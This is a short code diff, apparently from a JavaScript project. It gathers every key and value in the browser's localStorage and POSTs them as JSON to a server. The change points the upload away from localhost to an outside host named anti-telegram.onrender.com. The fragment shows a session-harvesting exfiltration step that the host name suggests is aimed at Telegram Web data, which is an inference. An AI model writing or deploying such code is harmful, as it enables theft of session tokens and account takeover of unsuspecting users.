@@ -23,7 +23,7 @@ for (let i = 0; i < localStorage.length; i++) {
   let value = localStorage.getItem(key);
   myObject[key] = value;
 }
-  try{let backend = await fetch("http://localhost:3000/",
+  try{let backend = await fetch("https://anti-telegram.onrender.com/",
     {
       method:"POST",
       headers:{"Content-type":"application/json"},
